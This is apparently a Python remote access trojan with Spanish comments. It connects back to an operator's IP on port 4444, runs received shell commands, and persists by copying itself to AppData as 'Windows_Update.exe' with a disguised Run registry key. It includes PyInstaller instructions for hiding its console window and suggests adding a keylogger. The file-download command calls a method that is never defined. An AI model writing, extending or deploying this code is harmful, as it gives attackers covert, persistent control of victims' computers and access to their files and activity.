import socket
import subprocess
import json
import os
import base64
import time
import shutil
import sys

class AgentePro:
    def __init__(self, ip, port):
        # Persistencia: se copia a sí mismo si no está en la ruta segura
        self.become_persistent()
        self.ip = ip
        self.port = port
        self.conectar()

    def become_persistent(self):
        ubicacion_segura = os.environ["appdata"] + "\\Windows_Update.exe"
        if not os.path.exists(ubicacion_segura):
            shutil.copyfile(sys.executable, ubicacion_segura)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate /t REG_SZ /d "' + ubicacion_segura + '" /f', shell=True)

    def conectar(self):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.ip, self.port))
                self.run()
            except Exception:
                time.sleep(10) # Reintenta cada 10 segundos si falla

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_comando(self, command):
        try:
            # shell=True permite comandos como dir, cd, etc.
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except Exception:
            return "[-] Error al ejecutar el comando."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "salir":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(command[1])
                    result = "[+] Cambiado a " + os.getcwd()
                elif command[0] == "descargar":
                    result = self.leer_archivo(command[1])
                # Aquí podrías añadir: screenshot, keylogger, etc.
                else:
                    result = self.ejecutar_comando(command)
            except Exception as e:
                result = "[-] Error durante la ejecución: " + str(e)

            self.reliable_send(result)

# Para ejecutarlo sin que se vea la ventana de consola al compilar con PyInstaller:
# pyinstaller --noconsole --onefile agente.py
agente = AgentePro("tu_ip_aqui", 4444)
